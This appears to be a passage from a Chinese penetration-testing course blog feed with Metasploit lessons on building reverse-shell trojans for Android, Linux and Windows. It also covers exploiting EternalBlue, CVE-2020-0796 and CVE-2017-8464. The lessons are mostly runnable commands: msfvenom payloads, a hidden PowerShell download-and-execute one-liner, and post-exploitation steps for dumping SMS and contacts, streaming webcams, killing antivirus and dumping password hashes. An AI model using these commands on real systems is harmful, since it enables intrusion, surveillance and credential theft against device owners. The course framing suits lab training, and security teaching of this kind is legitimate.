        <content type="html"><![CDATA[<p>第21课 ：后渗透之<strong>上传下载文件</strong></p><table><thead><tr><th align="center">ID</th><th>Command</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">1</td><td><code>upload</code></td><td align="center">传文件到靶机</td></tr><tr><td align="center">2</td><td><code>download</code></td><td align="center">从靶机下载文件</td></tr></tbody></table><p>第22课：后渗透之屏幕截图</p><table><thead><tr><th>ID</th><th>Command</th><th>Description</th></tr></thead><tbody><tr><td>1</td><td><code>screenshot</code></td><td>截图（Windows）</td></tr></tbody></table><p>第23课：后渗透之键盘记录</p><table><thead><tr><th>ID</th><th>Conmmand</th><th>Description</th></tr></thead><tbody><tr><td>1</td><td><code>keyscan_start</code></td><td>启动键盘记录(Windows)</td></tr><tr><td>2</td><td><code>keyscan_dump</code></td><td>导出键盘(Windows)</td></tr><tr><td>3</td><td><code>keyscan_stop</code></td><td>停止键盘记录(Windows)</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/20-hou-shen-tou-zhi-fang-wen-wen-jian-xi-tong/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/20-hou-shen-tou-zhi-fang-wen-wen-jian-xi-tong/</url>
      
        <content type="html"><![CDATA[<h1 id="一、后渗透之访问文件系统"><a href="#一、后渗透之访问文件系统" class="headerlink" title="一、后渗透之访问文件系统"></a>一、后渗透之访问文件系统</h1><p>1.文件交互指令</p><table><thead><tr><th align="center">ID</th><th align="left">Command</th><th align="left">Description</th></tr></thead><tbody><tr><td align="center">1</td><td align="left"><code>cat</code></td><td align="left">读取文件内容</td></tr><tr><td align="center">2</td><td align="left"><code>cd</code></td><td align="left">切换靶机目录</td></tr><tr><td align="center">3</td><td align="left"><code>cp</code></td><td align="left">复制文件到目标</td></tr><tr><td align="center">4</td><td align="left"><code>mv</code></td><td align="left">移动到目标</td></tr><tr><td align="center">5</td><td align="left"><code>chmod</code></td><td align="left">修改文件权限（比如chmod 777 shell.elf）</td></tr><tr><td align="center">6</td><td align="left"><code>del / rm</code></td><td align="left">删除靶机文件</td></tr><tr><td align="center">7</td><td align="left"><code>dir</code></td><td align="left">打印靶机目录</td></tr><tr><td align="center">8</td><td align="left"><code>mkdir</code></td><td align="left">在靶机上创建目录</td></tr><tr><td align="center">9</td><td align="left"><code>rmdir</code></td><td align="left">删除靶机目录</td></tr><tr><td align="center">10</td><td align="left"><code>edit</code></td><td align="left">编辑文件</td></tr><tr><td align="center">11</td><td align="left"><strong><code>getlwd</code></strong></td><td align="left">打印<strong>本地</strong>目录</td></tr><tr><td align="center">12</td><td align="left"><code>getwd</code></td><td align="left">打印靶机目录</td></tr><tr><td align="center">13</td><td align="left"><strong><code>lcd</code></strong></td><td align="left">更改<strong>本地</strong>目录</td></tr><tr><td align="center">14</td><td align="left"><strong><code>lls</code></strong></td><td align="left">列出<strong>本地</strong>目录</td></tr><tr><td align="center">15</td><td align="left"><code>ls</code></td><td align="left">列出靶机文件目录</td></tr><tr><td align="center">16</td><td align="left"><strong><code>lpwd</code></strong></td><td align="left">打印<strong>本地</strong>目录</td></tr><tr><td align="center">17</td><td align="left"><code>pwd</code></td><td align="left">打印工作目录</td></tr><tr><td align="center">19</td><td align="left"><code>search</code></td><td align="left">搜索文件 详情search -h</td></tr></tbody></table><p>Linux权限理解</p><pre class="line-numbers language-none"><code class="language-none">chmod  777   {文件名.后缀}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>chmod  777 shell.elf</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/19-tong-guo-mu-ma-fan-dan-shell-android/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/19-tong-guo-mu-ma-fan-dan-shell-android/</url>
      
        <content type="html"><![CDATA[<h1 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h1><ol><li>MSF-Metasploit Framework</li><li>一台安卓手机或者模拟器</li></ol><h1 id="二、木马生成"><a href="#二、木马生成" class="headerlink" title="二、木马生成"></a>二、木马生成</h1><ol><li>生成一个APK后门</li></ol><pre class="line-numbers language-none"><code class="language-none">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4567 R&gt;k.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="三、配置监控"><a href="#三、配置监控" class="headerlink" title="三、配置监控"></a>三、配置监控</h1><ol><li><p>启动msf   终端内输入：<code>msfconsole</code> 启动msf![1643003592876](21 通过木马反弹shell（Android）.assets/1643003592876.png)</p></li><li><p>载入监控模块  msf中输入：  </p><p><code>use exploit/multi/handler</code></p></li><li><p>载入payload MSF终端中输入： </p><p><code>set payload android/meterpreter/reverse_tcp</code></p><p>![1643003612323](21 通过木马反弹shell（Android）.assets/1643003612323.png)</p></li><li><p>配置payload  MSF终端中输入：<code>show options</code></p></li><li><p>配置监控IP MSF中输入：<code>set lhost  192.168.70.3</code></p></li><li><p>配置监控端口  MSF中输入：<code>set lport 4567</code></p></li><li><p>执行监控  msf终端中输入： </p><p><code>run</code>![1643003633911](21 通过木马反弹shell（Android）.assets/1643003633911.png)</p></li></ol><h1 id="四、攻击利用"><a href="#四、攻击利用" class="headerlink" title="四、攻击利用"></a>四、攻击利用</h1><ol><li><p>将木马上传到靶机</p></li><li><p>在靶机上执行木马</p></li><li><p>完成攻击利用</p><p>![1643003654523](21 通过木马反弹shell（Android）.assets/1643003654523.png)</p></li></ol><p>获取手机通讯录： <code>dump_contacts</code></p><p>获取短信记录：<code>dump_sms</code></p><p>控制实验手机发短信：<code>send_sms -d 15330252525 -t "hello"</code></p><p>获取实验手机GPS定位信息：<code>geolocate</code></p><p>获取实验手机Wi-Fi定位信息：<code>wlan_geolocate</code></p><p>控制实验手机录音：<code>record_mic -d  5</code></p><p>获取实验手机相机设备：<code>webcam_list</code></p><p>控制实验手机拍照 ：<code>webcam_snap</code></p><p><strong>直播实验手机摄像头</strong>：<code>webcam_stream</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/18-tong-guo-mu-ma-fan-dan-shell-linux/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/18-tong-guo-mu-ma-fan-dan-shell-linux/</url>
      
        <content type="html"><![CDATA[<h1 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h1><ol><li>MSF-Metasploit Framework</li><li>一台靶机</li></ol><h1 id="二、木马生成"><a href="#二、木马生成" class="headerlink" title="二、木马生成"></a>二、木马生成</h1><ol><li><p>生成一个Linux后门</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.70.3 LPORT=4567 -f elf &gt; shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![1643108165465](18 通过木马反弹shell（Linux）.assets/1643108165465.png)</p></li></ol><h1 id="三、配置监控"><a href="#三、配置监控" class="headerlink" title="三、配置监控"></a>三、配置监控</h1><ol><li><p>启动msf   终端内输入：<code>msfconsole</code> 启动msf</p><p>![1643108186343](18 通过木马反弹shell（Linux）.assets/1643108186343.png)</p></li><li><p>载入监控模块  msf中输入：  <code>use exploit/multi/handler</code></p></li><li><p>加载payload  msf终端中输入：</p><p><code>set payload linux/x64/meterpreter/reverse_tcp</code></p></li><li><p>配置payload  msf终端中输入：<code>show options</code></p><p>![1643108202630](18 通过木马反弹shell（Linux）.assets/1643108202630.png)</p></li><li><p>配置payload监控IP msf终端中输入： <code>set  lhost  192.168.70.3</code></p></li><li><p>配置payload监控端口  msf终端中输入：<code>set lport  4567</code> （注意这里要和木马配置时使用的端口相同&amp;如果使用内网穿透服务填写转发后的端口）</p></li><li><p>检查payload配置  msf终端中输入：<code>show options</code></p></li><li><p>执行监控  msf终端中输入： <code>run</code></p><p>![1643108218621](18 通过木马反弹shell（Linux）.assets/1643108218621.png)</p></li></ol><h1 id="四、攻击利用"><a href="#四、攻击利用" class="headerlink" title="四、攻击利用"></a>四、攻击利用</h1><ol><li><p>将木马上传到靶机 </p><p>通过python创建一个简单web服务</p><p><code>python3 -m http.server 80</code></p><p>或</p><p> <code>python2 -m SimpleHTTPServer 80</code></p></li><li><p>在靶机上<strong>执行</strong>木马 </p></li><li><p>完成攻击利用</p><p>![1643108263211](18 通过木马反弹shell（Linux）.assets/1643108263211.png)</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/17-sheng-cheng-mu-ma-fan-dan-shell-windows/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/17-sheng-cheng-mu-ma-fan-dan-shell-windows/</url>
      
        <content type="html"><![CDATA[<p>生成木马反弹shell（Windows）</p><h1 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h1><ol><li>MSF-Metasploit Framework</li><li>一台windiows靶机</li></ol><h1 id="二、开始生成木马"><a href="#二、开始生成木马" class="headerlink" title="二、开始生成木马"></a>二、开始生成木马</h1><ol><li>使用msfvenom生成木马</li><li>终端内输入:</li></ol><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3  LPORT=4567  -e x86/shikata_ga_nai -i 5 -f exe -o  shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="三、配置监控"><a href="#三、配置监控" class="headerlink" title="三、配置监控"></a>三、配置监控</h1><ol><li><p>启动msf   终端内输入：<code>msfconsole</code> 启动msf</p><p><img src="%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88Windows%EF%BC%89.assets/1642501758409.png" alt="1642501758409"></p></li><li><p>载入监控模块  msf中输入： <code>use exploit/multi/handler</code></p><p><img src="%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88Windows%EF%BC%89.assets/1642501831818.png" alt="1642501831818"></p></li><li><p>加载payload  msf终端中输入：<code>set payload windows/meterpreter/reverse_tcp</code></p></li><li><p>配置payload  msf终端中输入：<code>show options</code></p></li><li><p>配置payload监控IP msf终端中输入： <code>set  lhost 192.168.70.3</code></p></li><li><p>配置payload监控端口  msf终端中输入：<code>set lport  4567</code> （注意这里要和木马配置时使用的端口相同&amp;如果使用内网穿透服务填写转发后的端口）</p></li><li><p>检查payload配置  msf终端中输入：<code>show options</code> </p><p><img src="%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88Windows%EF%BC%89.assets/1642501934250.png" alt="1642501934250"></p></li><li><p>执行监控  msf终端中输入： <code>run</code></p></li></ol><h1 id="四、攻击利用"><a href="#四、攻击利用" class="headerlink" title="四、攻击利用"></a>四、攻击利用</h1><ol><li><p>将木马上传到靶机</p></li><li><p>在靶机上执行木马</p></li><li><p>完成攻击利用</p><p><img src="%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%88Windows%EF%BC%89.assets/1642501969373.png" alt="1642501969373"></p></li><li><p>查看进程：<code>ps</code></p></li><li><p>查看当前进程号：<code>getpid</code></p></li><li><p>查看<strong>系统信息</strong>：<code>sysinfo</code></p></li><li><p>查看目标机是否为虚拟机：</p></li><li><p><code>run post/windows/gather/checkvm</code></p></li><li><p>查看完整网络设置：<code>route</code></p></li><li><p>查看<strong>当前权限</strong>：<code>getuid</code></p></li><li><p><strong>自动提权</strong>：<code>getsystem</code></p></li><li><p>关闭杀毒软件：<code>run post/windows/manage/killav</code></p></li><li><p>启动远程桌面协议：<code>run post/windows/manage/enable_rdp</code></p></li><li><p>列举当前登录的用户：</p></li><li><p><code>run post/windows/gather/enum_logged_on_users</code></p></li><li><p>查看当前应用程序：</p></li><li><p><code>run post/windows/gather/enum_applications</code></p></li><li><p>抓取目标机的<strong>屏幕截图</strong>：<code>load espia</code> ； <code>screengrab</code></p></li><li><p>获取相机设备：<code>webcam_list</code></p></li><li><p>控制拍照 ：<code>webcam_snap</code></p></li><li><p><strong>直播摄像头</strong>：<code>webcam_stream</code></p></li><li><p><strong>观看屏幕</strong>：<code>run vnc</code></p></li><li><p>控制录音：<code>record_mic</code></p></li><li><p>查看<strong>当前目录</strong>：<code>pwd</code></p></li><li><p>查看当前目录：<code>getlwd</code></p></li><li><p>导出<strong>当前用户密码哈希</strong>  <code>run hashdump</code></p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/16-cve-2020-0796-yong-heng-zhi-hei-lou-dong/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/16-cve-2020-0796-yong-heng-zhi-hei-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-CVE-2020-0796-永恒之黑漏洞"><a href="#一、-CVE-2020-0796-永恒之黑漏洞" class="headerlink" title="一、 CVE-2020-0796 永恒之黑漏洞"></a>一、 CVE-2020-0796 永恒之黑漏洞</h1><p>永恒之黑漏洞与“永恒之蓝”漏洞极为相似，都是利用<strong>Windows SMB漏洞</strong>远程攻击获取系统最高权限。</p><p><strong>漏洞危害等级：高危</strong></p><p>“永恒之黑”漏洞高危之处在于对SMB客户端的攻击，攻击者可以通过构造一个“特制”的网页、压缩包、共享目录、OFFICE文档等，向攻击目标发送，一旦被攻击者打开则瞬间触发漏洞受到攻击。</p><p>漏洞成因：<br>CVE-2020-0796 漏洞存在于受影响版本的 Windows 驱动 <strong>srv2.sys</strong> 中，由于 Windows SMB 更新到 3.1.1 版本增加了<strong>对压缩数据</strong>的支持，未对用户传输的压缩数据的合法性进行校验。</p><p>受影响的Windows版本</p><p>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows Server, version 1903 (Server Core installation)<br>Windows Server, version 1909 (Server Core installation)</p><h1 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h1><p>1 一个受影响的windows版本</p><p>2  正常的电脑</p><h1 id="三、开始利用"><a href="#三、开始利用" class="headerlink" title="三、开始利用"></a>三、开始利用</h1><p>首先确认当前作为靶机的Windows系统是受影响的版本</p><p>Windows版本，按win+r，在弹出运行窗口中，输入 <code>winver</code></p><p>![1642062038435](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062038435.png)</p><h2 id="1、-漏洞发现"><a href="#1、-漏洞发现" class="headerlink" title="1、 漏洞发现"></a>1、 漏洞发现</h2><p>![1642062059301](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062059301.png)</p><p>使用奇安信的漏洞探测工具</p><p>直接在cmd中启动  CVE-2020-0796-Scanner.exe</p><p>根据提示输入扫描目标IP 或者扫描IP范围</p><p>![1642062077901](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062077901.png)</p><h2 id="2、准备蓝屏payload"><a href="#2、准备蓝屏payload" class="headerlink" title="2、准备蓝屏payload"></a>2、准备蓝屏payload</h2><p>![1642062098119](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062098119.png)</p><p>使用CVE-2020-0796 蓝屏工具进行攻击</p><p>python3 CVE-2020-0796.py <code>&lt;查询到存在漏洞的IP&gt;</code></p><p><code>python3 CVE-2020-0796.py  192.168.3.38</code></p><p>如果靶机没有蓝屏就重新攻击一下</p><p>![1642062112224](一、 CVE-2020-0796 永恒之黑漏洞.assets/1642062112224.png)</p><p>扩展阅读：</p><p>微软披露了一个最新的SMBv3(3.1.1)远程代码执行漏洞(CVE-2020-0796)，俗称“永恒之黑”。本漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出。利用该漏洞，攻击方可直接远程攻击SMB服务端远程执行任意恶意代码，亦可通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端。永恒之黑一旦被成功利用，其危害不亚于永恒之蓝。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/15-cve-2017-8464/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/15-cve-2017-8464/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-什么是-CVE-2017-8464："><a href="#一、-什么是-CVE-2017-8464：" class="headerlink" title="一、 什么是 CVE-2017-8464："></a>一、 什么是 CVE-2017-8464：</h1><p>说明：</p><p>2017年6月13日，微软官方发布编号为CVE-2017-8464的漏洞公告，官方介绍Windows系统在<strong>解析快捷方式</strong>时存在<strong>远程执行任意代码</strong>的高危漏洞，黑客可以通过U盘、网络共享等途径触发漏洞，完全控制用户系统，安全风险高危</p><p>传播的载体一般是LNK ，<strong>LNK</strong>是windows系统内应用程序<strong>快捷方式</strong>文件的文件<strong>类型后缀名</strong>。</p><p>危害：</p><p>被攻击机插入存在攻击lnk的U盘后会反弹shell，哪怕是被隔离的内网，也可以在不上网的情况下被攻击。</p><h1 id="二、环境准备："><a href="#二、环境准备：" class="headerlink" title="二、环境准备："></a>二、环境准备：</h1><p>1 可复现的操作系统版本：</p><ul><li>Microsoft Windows 10 Version 1607 for 32-bit Systems</li><li>Microsoft Windows 10 Version 1607 for x64-based Systems</li><li>Microsoft Windows 10 for 32-bit Systems</li><li>Microsoft Windows 10 for x64-based Systems</li><li>Microsoft Windows 10 version 1511 for 32-bit Systems</li><li>Microsoft Windows 10 version 1511 for x64-based Systems</li><li>Microsoft Windows 10 version 1703 for 32-bit Systems</li><li>Microsoft Windows 10 version 1703 for x64-based Systems</li><li>Microsoft Windows 7 for 32-bit Systems SP1</li><li>Microsoft Windows 7 for x64-based Systems SP1</li><li>Microsoft Windows 8.1 for 32-bit Systems</li><li>Microsoft Windows 8.1 for x64-based Systems</li><li>Microsoft Windows RT 8.1</li></ul><p>2 可复现的服务器系统版本：</p><ul><li>Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1</li><li>Microsoft Windows Server 2008 R2 for x64-based Systems SP1</li><li>Microsoft Windows Server 2008 for 32-bit Systems SP2</li><li>Microsoft Windows Server 2008 for Itanium-based Systems SP2</li><li>Microsoft Windows Server 2008 for x64-based Systems SP2</li><li>Microsoft Windows Server 2012</li><li>Microsoft Windows Server 2012 R2</li><li>Microsoft Windows Server 2016</li></ul><p>3 kali操作系统</p><h1 id="三、利用原理-："><a href="#三、利用原理-：" class="headerlink" title="三、利用原理 ："></a><strong>三、利用原理</strong> ：</h1><p>创建恶意快捷方式，包含恶意执行脚本，点击恶意快捷方式，导致本机中病毒，并且被远控。</p><h1 id="四、实战利用"><a href="#四、实战利用" class="headerlink" title="四、实战利用"></a>四、实战利用</h1><p>启动MSF</p><p>终端内输入：<code>msfconsole</code></p><p>开始利用：</p><h4 id="1、使用MSF创建一个后门"><a href="#1、使用MSF创建一个后门" class="headerlink" title="1、使用MSF创建一个后门"></a>1、使用MSF创建一个后门</h4><p>msf内输入：</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.70.3 lport=4456 -f psh-reflection&gt;/var/www/html/link.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2、在kali下开启apache2"><a href="#2、在kali下开启apache2" class="headerlink" title="2、在kali下开启apache2"></a>2、在kali下开启apache2</h4><p>终端内输入：<code>service apache2 start</code></p><h4 id="3、通过社会学进行快捷方式传播"><a href="#3、通过社会学进行快捷方式传播" class="headerlink" title="3、通过社会学进行快捷方式传播"></a>3、通过社会学进行快捷方式传播</h4><pre class="line-numbers language-none"><code class="language-none">powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.70.3/link.ps1');test.ps1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>![1641972171811](一、 什么是 CVE-2017-8464：.assets/1641972171811.png) </p><p>![1641972183309](一、 什么是 CVE-2017-8464：.assets/1641972183309.png)</p><h4 id="4-回到MSF终端配置监听"><a href="#4-回到MSF终端配置监听" class="headerlink" title="4 回到MSF终端配置监听"></a>4 回到MSF终端配置监听</h4><p>msf内输入：  </p><p><code>use exploit/multi/handler</code></p><h4 id="5-配置payload"><a href="#5-配置payload" class="headerlink" title="5 配置payload"></a>5 配置payload</h4><p><code>set payload windows/x64/meterpreter/reverse_tcp</code></p><p>![1641972198597](一、 什么是 CVE-2017-8464：.assets/1641972198597.png)</p><p>msf中输入 ： <code>show options</code>   配置payload</p><p>![1641972211876](一、 什么是 CVE-2017-8464：.assets/1641972211876.png)</p><p>设置 LHOST  和  LPORT</p><p>maf中输入：</p><p> <code>set lhost 192.168.70.3</code> 设置 LHOST</p><p><code>set lport 4456</code> 设置 LPORT</p><p>![1641972223277](一、 什么是 CVE-2017-8464：.assets/1641972223277.png)</p><p>最后在 输入 <code>show options</code> 查看配置是否生效</p><p>![1641972233527](一、 什么是 CVE-2017-8464：.assets/1641972233527.png)</p><h4 id="6、执行监听"><a href="#6、执行监听" class="headerlink" title="6、执行监听"></a>6、执行监听</h4><p>msf中输入 ： <code>run</code> 或者  <code>exploit</code></p><p>![1641972244295](一、 什么是 CVE-2017-8464：.assets/1641972244295.png)</p><p>进入靶机<strong>执行</strong>我们在靶机上创建的<strong>快捷方式</strong></p><p>![1641972183309](一、 什么是 CVE-2017-8464：.assets/1641972183309.png)</p><p>稍等片刻获取到meterpreter</p><p>![1641972268406](一、 什么是 CVE-2017-8464：.assets/1641972268406.png)</p><h1 id="五、后渗透"><a href="#五、后渗透" class="headerlink" title="五、后渗透"></a>五、后渗透</h1><p>1、通过快捷方式执行程序</p><p>meterpreter中输入  shell</p><p>![1641972283719](一、 什么是 CVE-2017-8464：.assets/1641972283719.png)</p><p>发现shell显示有<strong>乱码</strong></p><p>linux和windows显示编码不一样。</p><p><strong>修改显示编码</strong>，shell内输入  <code>chcp 65001</code></p><p>![1641972295944](一、 什么是 CVE-2017-8464：.assets/1641972295944.png)</p><p>然后进入desktop目录（这个是win的桌面）</p><p>根据实际情况拼路径</p><p>shell 里输入：<code>cd c:/users/mb/desktop</code></p><p>查看当前目录文件：<code>dir</code></p><p>![1641972307789](一、 什么是 CVE-2017-8464：.assets/1641972307789.png)</p><p>2 更多操作</p><ol><li><p>查看进程：ps</p></li><li><p>查看当前进程号：getpid</p></li><li><p>查看系统信息：sysinfo</p></li><li><p>查看目标机是否为虚拟机：run post/windows/gather/checkvm</p></li><li><p>查看完整网络设置：route</p></li><li><p>查看当前权限：getuid</p></li><li><p>自动提权：getsystem</p></li><li><p>关闭杀毒软件：run post/windows/manage/killav</p></li><li><p>启动远程桌面协议：run post/windows/manage/enable_rdp</p></li><li><p>列举当前登录的用户：</p><p>run post/windows/gather/enum_logged_on_users</p></li><li><p>查看当前应用程序：run post/windows/gather/enum_applications</p></li><li><p>抓取目标机的屏幕截图：load espia ； screengrab</p></li><li><p>抓取摄像头的照片：webcam_snap</p></li><li><p>查看当前处于目标机的那个目录：pwd</p></li><li><p>查看当前目录：getlwd</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/14-yong-heng-zhi-lan-li-yong-wen-dang/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/14-yong-heng-zhi-lan-li-yong-wen-dang/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-环境准备"><a href="#一、-环境准备" class="headerlink" title="一、 环境准备"></a><strong>一、 环境准备</strong></h1><p>1 一台Windows电脑</p><p>（可以使用虚拟机代替）</p><h3 id="2-Metasploit任意平台"><a href="#2-Metasploit任意平台" class="headerlink" title="2 Metasploit任意平台"></a>2 Metasploit任意平台</h3><p>  可以是Windows版，可以是kali自带版</p><h1 id="二、-CVE-2017-0144-介绍"><a href="#二、-CVE-2017-0144-介绍" class="headerlink" title="二、 CVE-2017-0144 介绍"></a><strong>二、</strong> CVE-2017-0144 介绍</h1><p>1.何为CVE-2017-0144？</p><p>​    CVE-2017-0144 既 永恒之蓝最早爆发于2017年4月14日晚，是一种利用<strong>Windows系统的SMB协议漏洞</strong>来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了勒索病毒，使全世界大范围内遭受了勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。</p><p>2.什么是SMB协议？</p><p> SMB是一个协议服务器信息块，它是一种客户机/服务器、请求/响应协议，通过SMB协议可以在计算机间<strong>共享</strong>文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP/IP协议之上，SMB使用<strong>TCP139</strong>端口和<strong>TCP445</strong>端口。</p><p>3.SMB工作原理是什么？</p><p>   （1）：首先客户端发送一个SMB negport 请求数据报，，并列出它所支持的所有SMB的协议版本。服务器收到请求消息后响应请求，并列出希望使用的SMB协议版本。如果没有可以使用的协议版本则返回0XFFFFH，结束通信。</p><p>   （2）：协议确定后，客户端进程向服务器发起一个用户或共享的认证，这个过程是通过发送SessetupX请求数据包实现的。客户端发送一对用户名和密码或一个简单密码到服务器，然后通过服务器发送一个SessetupX应答数据包来允许或拒绝本次连接。</p><p>   （3）：当客户端和服务器完成了磋商和认证之后，它会发送一个Tcon或TconX SMB数据报并列出它想访问的网络资源的名称，之后会发送一个TconX应答数据报以表示此次连接是否接收或拒绝。</p><p>   （4）：连接到相应资源后，SMB客户端就能够通过open SMB打开一个文件，通过read SMB读取文件，通过write SMB写入文件，通过close SMB关闭文件。</p><h1 id="三、原理"><a href="#三、原理" class="headerlink" title="三、原理"></a><strong>三、原理</strong></h1><p>​永恒之蓝是在Windows的SMB服务处理<strong>SMB v1请求时发生的漏洞</strong>，这个漏洞导致攻击者在目标系统上可以执行任意代码。</p><p>​通过永恒之蓝漏洞会<strong>扫描开放445文件共享端口的Windows机器</strong>，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p><h1 id="四、CVE-2017-0144-利用方法"><a href="#四、CVE-2017-0144-利用方法" class="headerlink" title="四、CVE-2017-0144 利用方法"></a><strong>四、CVE-2017-0144 利用方法</strong></h1><p>1  启动Metasploit</p><p>终端里输入 <code>msfconsole</code></p><p>2 查询利用模块</p><p>终端里输入 <code>search ms17_010</code></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/960ae38818084260be8eb69e589edba4.png" alt="img"></p><p>3 使用<strong>探测</strong>模块</p><p>终端内输入  <code>use auxiliary/scanner/smb/smb_ms17_010</code></p><p>4 设置探测范围</p><p>终端内输入  <code>show options</code>   </p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/ab7ca3d4ba774677bc2a239c420349f7.png" alt="img"></p><p>上图中我们可以看到是需要配置一个RHOSTS  </p><p>终端内输入  <code>set rhosts  192.168.70.0/24</code>  </p><p>（设置扫描当前网段  可以通过 在终端内输入ip a 查看）</p><p>也可以设置范围 </p><p><code>set rhosts 192.168.70.1-192.168.70.20</code></p><p>5 开始探测</p><p>终端内输入  <code>run</code> 执行探测</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/7df1f73ea464404091de9c13d885c139.png" alt="img"></p><p>根据上图我们可以看到 192.168.70.13 这个IP的机器可能存在漏洞</p><p>6 开始漏洞利用</p><p>开始利用首先在终端里输入<br><code>search ms17_010</code></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/8bf107d057a34676984a5d5e8b9bae73.png" alt="img"><br>使用 模块<br><code>use exploit/windows/smb/ms17_010_eternalblue</code></p><p>7 配置利用模块</p><p>配置模块<br><code>show options</code><br>配置靶机<br><code>set rhost 192.168.70.13</code>  这里IP填第五步探测到的IP</p><p>8 执行攻击</p><p>在终端里输入  <code>run</code></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641450314000/8a0c81062f424c7682a329503a315313.png" alt="img"></p><p>知道咱们看到 win  则攻击成功 拿到meterpreter </p><p>9 后渗透操作</p><ol><li><p>查看进程：<code>ps</code></p></li><li><p>查看当前进程号：getpid</p></li><li><p>查看系统信息：<code>sysinfo</code></p></li><li><p>查看目标机是否为虚拟机：run post/windows/gather/checkvm</p></li><li><p>查看完整网络设置：route</p></li><li><p>查看当前权限：<code>getuid</code></p></li><li><p>自动提权：<code>getsystem</code></p></li><li><p>关闭杀毒软件：run post/windows/manage/killav</p></li><li><p>启动远程桌面协议：run 